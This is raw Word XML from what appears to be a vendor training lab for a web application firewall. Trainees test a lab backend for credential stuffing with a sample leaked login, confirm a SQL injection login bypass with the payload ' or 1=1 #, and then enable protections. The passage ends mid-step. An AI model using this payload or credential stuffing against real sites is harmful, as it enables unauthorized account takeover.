        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="40" w:name="_Toc72791983"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Testing for Credential Stuffing Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="39"/>
      <w:bookmarkEnd w:id="40"/>
    </w:p>
    <w:p w14:paraId="2C75BF56" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:r>
        <w:t>Databases of leaked credentials on the dark web are exploited for malicious activities such as Account Take Overs (ATO) by “stuffing” the credentials into login fields found all over the web.  This is commonly known as a Credential Stuffing attack.  We will test if our server is vulnerable to this.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3A2268" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Browse to your </w:t>
      </w:r>
      <w:r w:rsidRPr="007E022A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Backend Server URL</w:t>
      </w:r>
      <w:r>
        <w:t>.  Do not Browse to your CNAME</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D46B34B" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="007E022A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Login / Register</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5910F9" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Try logging in as </w:t>
      </w:r>
      <w:hyperlink r:id="rId31">
        <w:r w:rsidRPr="55E0BB2E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>julio.tan@gmail.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and password: </w:t>
      </w:r>
      <w:r w:rsidRPr="007E022A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>please</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FECFA4C" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:r>
        <w:t>You will see the login simply fails because that’s not a valid user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="014B0749" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="67E0EEC3" wp14:editId="3B348BFA">
            <wp:extent cx="2152650" cy="572074"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="597179537" name="Picture 5971795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179537"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId32">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2152650" cy="572074"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="36632E8C" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:r>
        <w:t>But that set of credentials is taken from a leaked database and is in fact a credential stuffing attack.  Your web application has no way of knowing this is a credential stuffing attack, because it appears like a legitimate login attempt, and can lead to account takeover.   Your server is vulnerable to this attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15FD7F17" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="41" w:name="_Toc72791984"/>
      <w:bookmarkStart w:id="42" w:name="_Toc1229794949"/>
      <w:r>
        <w:t>Blocking Credential Stuffing</w:t>
      </w:r>
      <w:bookmarkEnd w:id="41"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkEnd w:id="42"/>
    </w:p>
    <w:p w14:paraId="39014636" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:r>
        <w:t xml:space="preserve">WAF-as-a-Service leverages Barracuda Active Threat Intelligence </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>( ATI</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> ) to determine this is an attack.  You can read more about Barracuda ATI here:  </w:t>
      </w:r>
      <w:hyperlink r:id="rId33" w:anchor="benefit-1" w:history="1">
        <w:r w:rsidRPr="00BC761E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.barracuda.com/cap#benefit-1</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00EF4995" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Add the </w:t>
      </w:r>
      <w:r w:rsidRPr="00873138">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Bot Protection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> component</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E682F0" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Expand the Bot Protection Component</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043A18AB" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00873138">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Bot Attacks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then under </w:t>
      </w:r>
      <w:r w:rsidRPr="00873138">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Credential </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Attack Protection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> enter </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D1114B" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="50C40F79">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>email</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for the username field </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4691346D" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="50C40F79">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for the password field </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B950CB1" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69EAC731" wp14:editId="6EE886AD">
            <wp:extent cx="2628900" cy="1557398"/>
            <wp:effectExtent l="0" t="0" r="0" b="50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8900" cy="1557398"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3014CD00" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Wait a few seconds for WAF-as-a-Service to update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290945A7" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Browse to your </w:t>
      </w:r>
      <w:r w:rsidRPr="0015168C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, for example:  </w:t>
      </w:r>
      <w:hyperlink r:id="rId35" w:history="1">
        <w:r w:rsidRPr="006B31C7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://app######.prod.cudawaas.com/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="63C1EA89" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00820367">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Login / Register</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214F85EE" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Try logging in as </w:t>
      </w:r>
      <w:hyperlink r:id="rId36">
        <w:r w:rsidRPr="50C40F79">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>julio.tan@gmail.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and the password is: please</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D1AE1E" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Verify the WAF-as-a-Service blocks this, and after a few minutes the Firewall Log shows this.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41116048" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:r>
        <w:t>Now we know we are under a credential stuffing attack, and are protected from it, and we know details of the attacker such as their source IP address, what country they are from, and other details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A78A84" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69839FEB" wp14:editId="799AEAFC">
            <wp:extent cx="5928362" cy="1380490"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1449851369" name="Picture 14498513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8362" cy="1380490"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="771BC104" w14:textId="07248E0A" w:rsidR="00F90E1A" w:rsidRPr="002D2B05" w:rsidRDefault="00F90E1A" w:rsidP="00172641">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51F92132" w14:textId="3DC556CE" w:rsidR="003048C0" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="43" w:name="_Toc27310006"/>
      <w:bookmarkStart w:id="44" w:name="_Toc72791970"/>
      <w:r>
        <w:t xml:space="preserve">OWASP #1 </w:t>
      </w:r>
      <w:r w:rsidR="008A0072">
        <w:t>Confirming the existence of</w:t>
      </w:r>
      <w:r w:rsidR="67A48E8C">
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:r w:rsidR="003048C0">
        <w:t>SQL Injection</w:t>
      </w:r>
      <w:r w:rsidR="466AAC3A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="033148C7">
        <w:t>Vulnerability</w:t>
      </w:r>
      <w:bookmarkEnd w:id="43"/>
      <w:bookmarkEnd w:id="44"/>
      <w:commentRangeStart w:id="45"/>
      <w:commentRangeEnd w:id="45"/>
      <w:r w:rsidR="008A0072">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="45"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D36146A" w14:textId="18C80C8E" w:rsidR="5ED453FE" w:rsidRDefault="3EF33465" w:rsidP="00BB5FA4">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We start our search for vulnerabilities with </w:t>
      </w:r>
      <w:r w:rsidR="7CAC4F28">
        <w:t xml:space="preserve">an attack from </w:t>
      </w:r>
      <w:r>
        <w:t>the OWASP Top 10</w:t>
      </w:r>
      <w:r w:rsidR="103131BC">
        <w:t xml:space="preserve"> ( </w:t>
      </w:r>
      <w:hyperlink r:id="rId38" w:history="1">
        <w:r w:rsidR="00BB5FA4" w:rsidRPr="00BC761E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://owasp.org/www-project-top-ten/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="103131BC">
        <w:t xml:space="preserve"> ). </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="5ED453FE">
        <w:t xml:space="preserve">Hackers </w:t>
      </w:r>
      <w:r w:rsidR="75EB4A25">
        <w:t>usually</w:t>
      </w:r>
      <w:r w:rsidR="5ED453FE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="75EB4A25">
        <w:t xml:space="preserve">attempt </w:t>
      </w:r>
      <w:r w:rsidR="5ED453FE">
        <w:t>to bypass user logins</w:t>
      </w:r>
      <w:r w:rsidR="7369E1EA">
        <w:t xml:space="preserve"> by exploiting a SQL Injection vulnerability</w:t>
      </w:r>
      <w:r w:rsidR="0FC26912">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="1CBBA981">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="004A4E45">
        <w:t>In this lesson, we will find the vulnerability.</w:t>
      </w:r>
      <w:r w:rsidR="1CBBA981">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EFF0662" w14:textId="5BAE3A41" w:rsidR="20A567D5" w:rsidRDefault="007E022A" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Browse</w:t>
      </w:r>
      <w:r w:rsidR="2DCF93AE">
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidR="2EAD73AF">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="151C9E21" w:rsidRPr="004A4E45">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Backend Server </w:t>
      </w:r>
      <w:r w:rsidR="2EAD73AF" w:rsidRPr="004A4E45">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidR="2EAD73AF">
        <w:t xml:space="preserve"> provided in the email</w:t>
      </w:r>
      <w:r w:rsidR="004A4E45">
        <w:t xml:space="preserve">, on port </w:t>
      </w:r>
      <w:r w:rsidR="004A4E45" w:rsidRPr="004A4E45">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>80</w:t>
      </w:r>
      <w:r w:rsidR="343984BC">
        <w:t xml:space="preserve">.  Note: You are </w:t>
      </w:r>
      <w:r w:rsidR="00BB719E">
        <w:t>g</w:t>
      </w:r>
      <w:r w:rsidR="343984BC">
        <w:t xml:space="preserve">oing directly to your Backend Server for this step.  Do not use the </w:t>
      </w:r>
      <w:r w:rsidR="007B3BC3">
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="343984BC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3D5E16" w14:textId="1EB218B6" w:rsidR="00390F68" w:rsidRDefault="5CCB9076" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You will see you are an </w:t>
      </w:r>
      <w:r w:rsidRPr="00642E0D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Unregistered User</w:t>
      </w:r>
      <w:r w:rsidR="6D0FFCD1">
        <w:t xml:space="preserve"> as shown near the top of the web page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316ACD9E" w14:textId="1644526A" w:rsidR="002259F8" w:rsidRDefault="002259F8" w:rsidP="002259F8">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="561A6C58" wp14:editId="31976265">
            <wp:extent cx="1924050" cy="447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1924050" cy="447138"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F45B63" w14:textId="1D01D36B" w:rsidR="00802A7C" w:rsidRDefault="00390F68" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00B17B43">
        <w:t xml:space="preserve">lick </w:t>
      </w:r>
      <w:r w:rsidR="00B17B43" w:rsidRPr="008F0A40">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Login / Register</w:t>
      </w:r>
      <w:r w:rsidR="008F0A40">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00357709">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="4BFE6576">
        <w:t>enter</w:t>
      </w:r>
      <w:r w:rsidR="00BB1043">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006C796E" w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>' or 1=1 #</w:t>
      </w:r>
      <w:r w:rsidR="006C796E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="3108F7BF">
        <w:t>for</w:t>
      </w:r>
      <w:r w:rsidR="00BB1043">
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="006C796E">
        <w:t xml:space="preserve">email </w:t>
      </w:r>
      <w:r w:rsidR="008C2437">
        <w:t>address, then</w:t>
      </w:r>
      <w:r w:rsidR="00442916">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008F0A40">
        <w:t xml:space="preserve">click </w:t>
      </w:r>
      <w:r w:rsidR="006C796E" w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Login</w:t>
      </w:r>
      <w:r w:rsidR="006C796E">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D403697" w14:textId="369C514C" w:rsidR="00390F68" w:rsidRDefault="678B1477" w:rsidP="002259F8">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006C796E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="1BB67E85">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2C83DCA5" wp14:editId="40084FBA">
            <wp:extent cx="3149609" cy="1554615"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="651647086" name="Picture 65164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6470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9609" cy="1554615"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ACC5F69" w14:textId="3778A253" w:rsidR="00683ACD" w:rsidRDefault="12920200" w:rsidP="00AC3C18">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>This SQL Injection will succeed, and y</w:t>
      </w:r>
      <w:r w:rsidR="006C796E">
        <w:t xml:space="preserve">ou will </w:t>
      </w:r>
      <w:r w:rsidR="7C4D17AF">
        <w:t xml:space="preserve">see near the top of the web page that you are </w:t>
      </w:r>
      <w:r w:rsidR="006C796E">
        <w:t>logged in as the “Test User” without knowing their real email address or password</w:t>
      </w:r>
      <w:r w:rsidR="5FD7A9D6">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B49A9BA" w14:textId="47D066D5" w:rsidR="00683ACD" w:rsidRDefault="18B56C94" w:rsidP="00AC3C18">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0D8197F2" wp14:editId="1926D795">
            <wp:extent cx="1868129" cy="542925"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1048885455" name="Picture 104888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885455"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId41">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="1868129" cy="542925"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2105CDE6" w14:textId="76B8C632" w:rsidR="00AC3C18" w:rsidRDefault="00AC3C18" w:rsidP="00AC3C18">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>This proves a SQL injection vulnerability exists on this site.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7471F8" w14:textId="29AFC102" w:rsidR="55E0BB2E" w:rsidRDefault="55E0BB2E" w:rsidP="00172641">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF06DAA" w14:textId="6F3A71B9" w:rsidR="00822AE6" w:rsidRDefault="25D99BA7" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="SimSun" w:hAnsi="Cambria" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="47" w:name="_Toc2014115859"/>
      <w:bookmarkStart w:id="48" w:name="_Toc72791971"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Blocking a SQL Injection Vulnerability</w:t>
      </w:r>
      <w:bookmarkEnd w:id="47"/>
      <w:bookmarkEnd w:id="48"/>
    </w:p>
    <w:p w14:paraId="65B64A23" w14:textId="05AF9B7F" w:rsidR="00822AE6" w:rsidRDefault="006C796E" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now </w:t>
      </w:r>
      <w:r w:rsidR="67EE9664">
        <w:t xml:space="preserve">we will </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">try the same </w:t>
      </w:r>
      <w:r w:rsidR="0EE8D197">
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
